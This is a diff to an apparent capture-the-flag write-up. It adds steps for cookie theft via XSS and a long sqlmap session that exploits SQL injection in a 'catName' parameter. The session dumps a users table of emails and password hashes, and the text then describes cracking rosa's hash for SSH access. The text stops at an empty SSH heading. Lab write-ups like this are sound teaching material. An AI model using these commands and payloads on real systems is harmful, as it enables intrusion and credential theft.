@@ -162,7 +162,7 @@ if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
 
 ----------------
 
-### Exploitation-:
+### XSS Exploitation-:
 
 ----------------
 
@@ -171,6 +171,178 @@ if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
 ![image](https://github.com/user-attachments/assets/289ef9df-267a-41fe-936b-1c8fefdc0fbc)
 
 - Set up a listener to grab the cookie and upload an image on `contest.php`
+
+![image](https://github.com/user-attachments/assets/84a11eba-2977-498e-bca2-f0e8b0c9ee9a)
+
+- Admin page accessed-:
+
+![image](https://github.com/user-attachments/assets/a0748a93-9d4d-4d19-9bbf-b3b5efdf33ee)
+
+-----------------
+
+### SQLI Exploitation-:
+
+------------------
+
+- The accept_cat page is vulnerable,I exploited with sqlmap.
+
+```bash
+❯ sqlmap -r special -p catName --batch --columns --level 5 --risk 3 --threads 4 --hex --dbms=sqlite --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.9.3#pip}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:46:00 /2025-03-20/
+
+[12:46:00] [INFO] parsing HTTP request from 'special'
+[12:46:00] [INFO] testing connection to the target URL
+[12:46:00] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:46:01] [INFO] testing if the target URL content is stable
+[12:46:01] [INFO] target URL content is stable
+[12:46:01] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable                                            
+[12:46:01] [INFO] testing for SQL injection on POST parameter 'catName'                                                                            
+[12:46:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                       
+[12:46:18] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)           
+[12:46:18] [INFO] testing 'Generic inline queries'                                                                                                 
+[12:46:18] [INFO] testing 'SQLite inline queries'                                                                                                  
+[12:46:18] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'                                                                   
+[12:46:18] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'                                                                             
+[12:46:18] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'                                                                        
+[12:46:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'                                                                         
+[12:46:52] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+[12:46:52] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+[12:46:52] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[12:46:52] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[12:46:52] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
+POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
+---
+Parameter: catName (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: catName=z'||(SELECT CHAR(83,68,84,77) WHERE 8522=8522 AND 8561=8561)||'&catId=1
+---
+[12:46:59] [INFO] testing SQLite
+[12:46:59] [INFO] confirming SQLite
+[12:46:59] [INFO] actively fingerprinting SQLite
+[12:46:59] [INFO] the back-end DBMS is SQLite
+web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: SQLite
+[12:46:59] [INFO] fetching tables for database: 'SQLite_masterdb'
+[12:46:59] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[12:47:04] [INFO] retrieved: 4    
+[12:47:04] [INFO] retrieving the length of query output
+[12:47:09] [INFO] retrieved: 26      
+[12:47:23] [INFO] retrieved: accepted_cats                            
+[12:47:23] [INFO] retrieving the length of query output
+[12:47:28] [INFO] retrieved: 30      
+[12:47:57] [INFO] retrieved: sqlite_sequence                                
+[12:47:57] [INFO] retrieving the length of query output                                                                                            
+[12:48:00] [INFO] retrieved: 8                                                                                                                     
+[12:48:04] [INFO] retrieved: cats                                                                                                                  
+[12:48:04] [INFO] retrieving the length of query output                                                                                            
+[12:48:11] [INFO] retrieved: 10                                                                                                                    
+[12:48:16] [INFO] retrieved: users                                                                                                                 
+[12:48:16] [INFO] retrieving the length of query output                                                                                            
+[12:48:23] [INFO] retrieved: 318                                                                                                                   
+[12:52:43] [INFO] retrieved: ..353529204E4F54204E554C4C2C0A2020202070617373776F726420564152434841522832353529204E4F54204E__4C4C0A29 316/318 (99%)
+[12:52:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                              
+[12:52:50] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[12:52:50] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+[12:52:51] [WARNING] unexpected response detected. Will use (extra) validation step in similar cases
+[12:52:51] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases
+[12:52:52] [INFO] retrieved: 435245415445205441424C4520757365727320280A20202020757365725F696420494E5445474552205052494D415259204B45592C0A20202020757365726E616D6520564152434841522832353529204E4F54204E554C4C2C0A20202020656D61696C20564152434841522832353529204E4F54204E554C4C2C0A2020202070617373776[12:52:52] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )                                                                                                                                                                                                                                                                                                                                
+Database: <current>
+Table: None
+[4 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| email    | VARCHAR |
+| password | VARCHAR |
+| user_id  | INTEGER |
+| username | VARCHAR |
++----------+---------+
+
+[12:52:52] [INFO] retrieving the length of query output
+[12:52:52] [INFO] resumed: 318
+[12:52:52] [INFO] resumed: CREATE TABLE users (\n    user_id INTEGER PRIMARY KEY,\n    username VARCHAR(255) NOT NULL,\n    email VARCHAR(255) NOT NULL,\n    password VARCHAR(255) NOT NULL\n)
+[12:52:52] [INFO] fetching entries for table 'users'
+[12:52:52] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
+[12:53:04] [INFO] retrieved: 11      
+[12:53:05] [INFO] retrieving the length of query output
+[12:53:10] [INFO] retrieved: 36      
+[12:53:55] [INFO] retrieved: axel2017@gmail.com                                      
+[12:53:55] [INFO] retrieving the length of query output
+[12:54:00] [INFO] retrieved: 64      
+[12:54:51] [INFO] retrieved: 64316262626133363730666562__3433356339383431653_________________ 45/64 (70%)
+[12:54:51] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[12:54:51] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+[12:54:52] [WARNING] unexpected HTTP code '200' detected. Will use (extra) validation step in similar cases
+[12:55:10] [INFO] retrieved: d1bbba3670feb9435c9841e46e60ee2f                                                                  
+[12:55:10] [INFO] retrieving the length of query output
+[12:55:13] [INFO] retrieved: 2    
+[12:55:15] [INFO] retrieved: 1            
+[12:55:15] [INFO] retrieving the length of query output
+[12:55:17] [INFO] retrieved: 8    
+[12:55:22] [INFO] retrieved: axel               
+[12:55:22] [INFO] retrieving the length of query output
+[12:55:27] [INFO] retrieved: 48      
+[12:56:31] [INFO] retrieved: rosamendoza485@gmail.com                                                  
+[12:56:31] [INFO] retrieving the length of query output
+[12:56:35] [INFO] retrieved: 64      
+[12:57:11] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c                                                                  
+[12:57:11] [INFO] retrieving the length of query output
+[12:57:20] [INFO] retrieved: 2    
+[12:57:22] [INFO] retrieved: 2            
+[12:57:22] [INFO] retrieving the length of query output
+[12:57:25] [INFO] retrieved: 8    
+[12:57:29] [INFO] retrieved: rosa               
+[12:57:29] [INFO] retrieving the length of query output
+[12:57:34] [INFO] retrieved: 58      
+[12:58:14] [INFO] retrieved: robertcervantes2000@gmail.com                                                            
+[12:58:14] [INFO] retrieving the length of query output
+[12:58:20] [INFO] retrieved: 64      
+[12:58:53] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad                                                                  
+[12:58:53] [INFO] retrieving the length of query output
+[12:58:56] [INFO] retrieved: 2    
+[12:58:59] [INFO] retrieved: 3            
+[12:58:59] [INFO] retrieving the length of query output
+```
+
+- A user `rosa`'s hash got exposed-:
+
+![image](https://github.com/user-attachments/assets/6c497d66-d4c7-4c07-b20b-c966d62f618a)
+
+- I cracked it with crackstation.
+
+![image](https://github.com/user-attachments/assets/97372e89-79be-4eae-8bc9-94560d9a262d)
+
+- SSH access as user `rosa`-:
+
+
+
+
+
+
+
+
+
 
 
 
